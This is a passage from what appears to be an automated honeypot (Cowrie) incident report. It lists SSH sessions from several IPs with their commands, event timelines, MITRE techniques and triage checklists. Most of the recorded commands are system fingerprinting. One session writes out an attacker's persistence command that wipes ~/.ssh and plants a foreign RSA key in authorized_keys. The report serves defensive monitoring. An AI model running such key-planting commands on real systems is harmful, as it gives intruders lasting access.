| `2026-07-04 04:10:00` | `cowrie.command.success` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:01` | `cowrie.log.closed` |
| `2026-07-04 04:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71b8f19e48e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:11 |
| **Last Seen** | 2026-07-04 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:11:19` | `cowrie.session.connect` |
| `2026-07-04 04:11:19` | `cowrie.client.version` |
| `2026-07-04 04:11:19` | `cowrie.client.kex` |
| `2026-07-04 04:11:19` | `cowrie.login.success` |
| `2026-07-04 04:11:20` | `cowrie.session.params` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.success` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.command.input` |
| `2026-07-04 04:11:20` | `cowrie.log.closed` |
| `2026-07-04 04:11:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b9ba001e28

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 04:11 |
| **Last Seen** | 2026-07-04 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:11:21` | `cowrie.session.connect` |
| `2026-07-04 04:11:21` | `cowrie.client.version` |
| `2026-07-04 04:11:21` | `cowrie.client.kex` |
| `2026-07-04 04:11:21` | `cowrie.login.success` |
| `2026-07-04 04:11:22` | `cowrie.session.params` |
| `2026-07-04 04:11:22` | `cowrie.command.input` |
| `2026-07-04 04:11:22` | `cowrie.log.closed` |
| `2026-07-04 04:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51824825201b

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-07-04 04:12 |
| **Last Seen** | 2026-07-04 04:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:12:29` | `cowrie.session.connect` |
| `2026-07-04 04:12:29` | `cowrie.client.version` |
| `2026-07-04 04:12:29` | `cowrie.client.kex` |
| `2026-07-04 04:12:29` | `cowrie.login.success` |
| `2026-07-04 04:12:30` | `cowrie.session.params` |
| `2026-07-04 04:12:30` | `cowrie.command.input` |
| `2026-07-04 04:12:30` | `cowrie.command.failed` |
| `2026-07-04 04:12:30` | `cowrie.log.closed` |
| `2026-07-04 04:12:31` | `cowrie.session.params` |
| `2026-07-04 04:12:31` | `cowrie.command.input` |
| `2026-07-04 04:12:31` | `cowrie.session.file_download` |
| `2026-07-04 04:12:31` | `cowrie.log.closed` |
| `2026-07-04 04:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387138b76144

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-07-04 04:12 |
| **Last Seen** | 2026-07-04 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:12:31` | `cowrie.session.connect` |
| `2026-07-04 04:12:31` | `cowrie.client.version` |
| `2026-07-04 04:12:31` | `cowrie.client.kex` |
| `2026-07-04 04:12:31` | `cowrie.login.success` |
| `2026-07-04 04:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917ce98ff138

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-07-04 04:12 |
| **Last Seen** | 2026-07-04 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:12:31` | `cowrie.session.connect` |
| `2026-07-04 04:12:31` | `cowrie.client.version` |
| `2026-07-04 04:12:31` | `cowrie.client.kex` |
| `2026-07-04 04:12:32` | `cowrie.login.success` |
| `2026-07-04 04:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68bedbc8d284

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:13 |
| **Last Seen** | 2026-07-04 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:13:49` | `cowrie.session.connect` |
| `2026-07-04 04:13:49` | `cowrie.client.version` |
| `2026-07-04 04:13:49` | `cowrie.client.kex` |
| `2026-07-04 04:13:50` | `cowrie.login.success` |
| `2026-07-04 04:13:51` | `cowrie.session.params` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.success` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.command.input` |
| `2026-07-04 04:13:51` | `cowrie.log.closed` |
| `2026-07-04 04:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d4344b7a0a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:17 |
| **Last Seen** | 2026-07-04 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:17:46` | `cowrie.session.connect` |
| `2026-07-04 04:17:46` | `cowrie.client.version` |
| `2026-07-04 04:17:46` | `cowrie.client.kex` |
| `2026-07-04 04:17:46` | `cowrie.login.success` |
| `2026-07-04 04:17:47` | `cowrie.session.params` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.success` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.command.input` |
| `2026-07-04 04:17:47` | `cowrie.log.closed` |
| `2026-07-04 04:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd3d1f31846

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:19 |
| **Last Seen** | 2026-07-04 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:19:16` | `cowrie.session.connect` |
| `2026-07-04 04:19:16` | `cowrie.client.version` |
| `2026-07-04 04:19:16` | `cowrie.client.kex` |
| `2026-07-04 04:19:17` | `cowrie.login.success` |
| `2026-07-04 04:19:17` | `cowrie.session.params` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.success` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:17` | `cowrie.command.input` |
| `2026-07-04 04:19:18` | `cowrie.log.closed` |
| `2026-07-04 04:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07bbf44da1d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 04:20 |
| **Last Seen** | 2026-07-04 04:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:20:49` | `cowrie.session.connect` |
| `2026-07-04 04:20:50` | `cowrie.client.version` |
| `2026-07-04 04:20:50` | `cowrie.client.kex` |
| `2026-07-04 04:20:56` | `cowrie.login.success` |
| `2026-07-04 04:21:00` | `cowrie.session.params` |
| `2026-07-04 04:21:00` | `cowrie.command.input` |
| `2026-07-04 04:21:02` | `cowrie.log.closed` |
| `2026-07-04 04:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-677a75a6982b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:22 |
| **Last Seen** | 2026-07-04 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:22:00` | `cowrie.session.connect` |
| `2026-07-04 04:22:00` | `cowrie.client.version` |
| `2026-07-04 04:22:00` | `cowrie.client.kex` |
| `2026-07-04 04:22:00` | `cowrie.login.success` |
| `2026-07-04 04:22:01` | `cowrie.session.params` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.success` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.command.input` |
| `2026-07-04 04:22:01` | `cowrie.log.closed` |
| `2026-07-04 04:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5335f40ade2e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:26 |
| **Last Seen** | 2026-07-04 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:26:28` | `cowrie.session.connect` |
| `2026-07-04 04:26:28` | `cowrie.client.version` |
| `2026-07-04 04:26:28` | `cowrie.client.kex` |
| `2026-07-04 04:26:28` | `cowrie.login.success` |
| `2026-07-04 04:26:29` | `cowrie.session.params` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.success` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.command.input` |
| `2026-07-04 04:26:29` | `cowrie.log.closed` |
| `2026-07-04 04:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f433cac38ccd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:26 |
| **Last Seen** | 2026-07-04 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:26:37` | `cowrie.session.connect` |
| `2026-07-04 04:26:37` | `cowrie.client.version` |
| `2026-07-04 04:26:37` | `cowrie.client.kex` |
| `2026-07-04 04:26:37` | `cowrie.login.success` |
| `2026-07-04 04:26:38` | `cowrie.session.params` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.success` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.command.input` |
| `2026-07-04 04:26:38` | `cowrie.log.closed` |
| `2026-07-04 04:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989a086ed32f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:30 |
| **Last Seen** | 2026-07-04 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:30:56` | `cowrie.session.connect` |
| `2026-07-04 04:30:56` | `cowrie.client.version` |
| `2026-07-04 04:30:56` | `cowrie.client.kex` |
| `2026-07-04 04:30:56` | `cowrie.login.success` |
| `2026-07-04 04:30:57` | `cowrie.session.params` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.success` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.command.input` |
| `2026-07-04 04:30:57` | `cowrie.log.closed` |
| `2026-07-04 04:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce561f71b37

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:02` | `cowrie.session.connect` |
| `2026-07-04 04:33:03` | `cowrie.client.version` |
| `2026-07-04 04:33:03` | `cowrie.client.kex` |
| `2026-07-04 04:33:10` | `cowrie.login.success` |
| `2026-07-04 04:33:14` | `cowrie.session.params` |
| `2026-07-04 04:33:14` | `cowrie.command.input` |
| `2026-07-04 04:33:17` | `cowrie.log.closed` |
| `2026-07-04 04:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd81a9ebc76

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:31` | `cowrie.session.connect` |
| `2026-07-04 04:33:31` | `cowrie.client.version` |
| `2026-07-04 04:33:32` | `cowrie.client.kex` |
| `2026-07-04 04:33:33` | `cowrie.login.success` |
| `2026-07-04 04:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bd64d67d6e

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:33` | `cowrie.session.connect` |
| `2026-07-04 04:33:33` | `cowrie.client.version` |
| `2026-07-04 04:33:33` | `cowrie.client.kex` |
| `2026-07-04 04:33:34` | `cowrie.login.success` |
| `2026-07-04 04:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13d87c04835
